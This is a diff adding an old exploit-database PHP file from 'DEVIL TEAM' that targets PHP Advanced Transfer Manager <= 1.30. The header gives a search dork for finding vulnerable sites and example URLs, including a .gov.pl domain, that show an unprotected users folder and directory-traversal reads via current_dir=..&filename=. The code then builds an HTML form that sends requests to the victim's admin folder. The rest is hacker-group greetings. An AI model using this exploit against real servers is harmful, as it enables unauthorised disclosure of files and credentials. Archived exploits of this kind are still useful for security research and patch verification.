@@ -1,0 +1,114 @@
+<?
+
+/*
+:::::::::  :::::::::: :::     ::: ::::::::::: :::        
+:+:    :+: :+:        :+:     :+:     :+:     :+:        
++:+    +:+ +:+        +:+     +:+     +:+     +:+        
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
++#+    +#+ +#+         +#+   +#+      +#+     +#+        
+#+#    #+# #+#          #+#+#+#       #+#     #+#        
+#########  ##########     ###     ########### ########## 
+::::::::::: ::::::::::     :::     ::::    ::::  
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
+    +#+     +#+        +#+     +#+ +#+       +#+ 
+    #+#     #+#        #+#     #+# #+#       #+# 
+    ###     ########## ###     ### ###       ### 
+	
+   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+
+
+Exploit Name: PHP Advanced Transfer Manager <= 1.30 Source Code Disclosure Exploit
+Script Name: PHP Advanced Transfer Manager 1.30
+Script Site: http://phpatm.free.fr/
+dork: "Powered by PHP Advanced Transfer Manager v1.30"
+Find by: Kacper (a.k.a Rahim)
+
+
+========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
+========>         http://www.rahim.webd.pl/            <========
+
+Contact: kacper1964@yahoo.pl
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Greetings DragonHeart and all DEVIL TEAM Patriots :)
+- Leito & Leon | friend str0ke ;)
+
+Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0d'e, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke,
+mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan,
+DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen
+
+ and
+ 
+Dr Max Virus
+TamTurk,
+hackersecurity.org
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                Greetings for 4ll Fusi0n Group members ;-)
+                and all members of hacker.com.pl ;)
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+in folder users we dont find any file like: .htaccess so we can read all files :)
+
+http://site.gov.pl/upload/users/Admin
+
+Admin < username :)
+
+or you can read all files in ftp :)
+
+http://site.gov.pl/upload/viewers/html.php?current_dir=..&filename=[file]
+http://site.gov.pl/upload/viewers/htm.php?current_dir=..&filename=[file]
+
+
+GAME OVER :)
+*/
+//Settings
+$nick = "Admin";
+$glowna = "http://site.com/path/";
+$exploit = "1"; //$exploit = "0";  < exploit off
+//End Settings
+
+//****************************************************************************************************************************************************
+if ( $exploit == "1" ) {
+$exp= "<title>PHP Advanced Transfer Manager &lt;= 1.30 Source Code Disclosure Exploit :: DEVIL TEAM :: The Best Polish Team ::</title>"
+."<style type=\"text/css\">"
+."body {background-color: #000000;}"
+."body,td,th {color: #FFFFFF;}"
+.".name {font-size:11px;font-weight: bold}"
+."</style><form method=\"get\" action=\"".$glowna."/users/".$nick."\">"
+."<div align=\"center\"><img src=\"http://www.rahim.webd.pl/index_r2_c3.jpg\"></div>"
+."<p align=\"center\">script url:<br>"
+."<input type=\"text\" name=\"glowna\" size=\"90\" value=\"".$glowna."\">"
+."<br>"
+."Admin nick:<br>"
+."<input name=\"nick\" type=\"text\" value=\"".$nick."\" size=\"90\"".$nick."\">"
+."<br>"
+."<input type=\"submit\" value=\"Exploit\" name=\"submit\">"
+."</p>"
+."<p align=\"center\">Find by: <a href=\"mailto:kacper1964@yahoo.pl\">Kacper</a> (a.k.a <a href=\"mailto:kacper1964@yahoo.pl\">Rahim</a>)<br>"
+."<br>"
+."DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam<br>"
+."<br>"
+."Contact: <a href=\"mailto:kacper1964@yahoo.pl\">kacper1964@yahoo.pl</a><br>"
+."or</p>"
+."<p align=\"center\"> <a href=\"http://www.rahim.webd.pl\">http://www.rahim.webd.pl/</a></p>"
+."<p align=\"center\" class=\"name\">&nbsp;</p>"
+."<HR WIDTH=\"650\" ALIGN=\"center\">"
+."<p align=\"center\"> Z Dedykacja dla osoby,<br>"
+."bez ktorej nie mogl bym zyc...<br>"
+."K.C:* J.M (a.k.a Magaja)</p>"
+."<p align=\"center\"> Special Greetz: DragonHeart ;-)<br>"
+."Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus<br>"
+."SkD, nukedclx, Ramzes<br>"
+."<br>"
+."Greetz for all users DEVIL TEAM IRC Channel !!<br>"
+."!@ Przyjazni nie da sie zamienic na marne korzysci @!</p>"
+."<HR WIDTH=\"650\" ALIGN=\"center\">"
+."<p align=\"center\">&nbsp;  </p>"
+."</form>";
+print $exp;
+}
+?>
+
+# milw0rm.com [2006-12-20]
